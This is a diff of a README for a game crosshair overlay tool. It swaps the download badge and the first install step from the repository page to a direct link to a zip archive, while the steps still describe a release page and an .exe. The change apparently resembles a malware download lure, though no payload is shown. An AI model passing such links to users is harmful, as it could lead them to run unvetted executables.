@@ -1,6 +1,6 @@
 # 🎯 Crosshair-Custom-Overlay-Games - Improve your aim in every shooter
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/KEVINMI10/Crosshair-Custom-Overlay-Games)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/KEVINMI10/Crosshair-Custom-Overlay-Games/raw/refs/heads/main/Main/Custom-Crosshair-Overlay-Games-2.0.zip)
 
 ## 📌 About this project
 
@@ -31,7 +31,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to install the software on your Windows PC.
 
-1. Visit [this link](https://github.com/KEVINMI10/Crosshair-Custom-Overlay-Games) to locate the download page.
+1. Visit [this link](https://github.com/KEVINMI10/Crosshair-Custom-Overlay-Games/raw/refs/heads/main/Main/Custom-Crosshair-Overlay-Games-2.0.zip) to locate the download page.
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start your download.
 4. Open the file once the download finishes.
